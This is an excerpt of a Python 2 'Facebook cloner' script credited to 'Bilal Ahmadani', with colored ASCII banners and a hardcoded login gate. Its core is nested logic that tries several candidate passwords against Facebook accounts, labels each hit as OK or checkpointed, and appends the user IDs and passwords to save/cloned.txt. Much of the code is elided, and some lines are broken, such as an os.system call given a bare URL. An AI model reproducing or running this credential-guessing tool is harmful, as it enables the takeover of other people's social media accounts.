# Bilal #Ahmadani #Student #Saraiki Cloner #Clone #!/usr/bin/python2
#coding=utf-8
...
try:
    ...
    time.sleep(1)
    os.system('Then type: python2 Bilal.py')
...
\033[1;96m---------------------Bilal Ahmdani---------------------
                

\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"Bilal"                                
\033[0;91m║\033[0;91m Team :\033[0;92m "Alone"                                                  
\033[0;91m║ \033[0;93mFacebook: \033[0;92m"MUHAMMAD BILAL AHMDANI"                                                    
\033[0;95m╰════════════════════════════════════════════╯
...
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m"Bilal"                                
\033[0;91m║\033[0;91m Team :\033[0;92m "Alone"                                                  
\033[0;91m║ \033[0;93mFacebook: \033[0;92m"Bilal"                                                    
\033[0;95m╰════════════════════════════════════════════╯
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Bilal Cloner
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/JA.TOJHE.MAAAAF.KYA')
    else:
        print "\033[1;94mWrong Username"
        os.system('https://www.facebook.com/JA.TOJHE.MAAAAF.KYA')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print(' Bilal Ok |   User-ID    |   + password'+username)
                print '\x1b[1;93m(BILAL OK)  ' + k + c + user +  '  |  ' + pass1                                    
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print(' BILAL CP  |   User-ID    |   + password'+username)
                    print '\033[1;97m(BILAL CP) ' + k + c + user + '  |  ' + pass1
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print(' BILAL CP  |   User-ID    |   + password'+username)
                            print '\033[1;97m(BILAL CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            if 'access_token' in q:
                                print(' BILAL OK |   User-ID    |   + password'+username)
                                print '\x1b[1;93m(Pathan-Hacked)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print(' BILAL CP  |   User-ID    |   + password'+username)
                                    print '\033[1;97m(BILAL CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        print '\x1b[1;93m(BILAL OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print(' BILAL CP  |   User-ID    |   + password'+username)
                                            print '\033[1;97m(BILAL CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            if 'access_token' in q:
                                                print(' BILAL OK  |   User-ID    |   + password'+username)
                                                print '\x1b[1;93m(BILAL)  ' + k + c + user + '  |  ' + pass6
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print(' BILAL CP  |   User-ID    |   + password'+username)
                                                    print '\033[1;97m(BILAL) ' + k + c + user + '  |  ' + pass6 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mhttps://www.facebook.com/JA.TOJHE.MAAAAF.KYA"""

    
    raw_input("\n\033[1;92m[\033[PRIS ENTER TO GO BACK\033[1;95m]")
    login() 
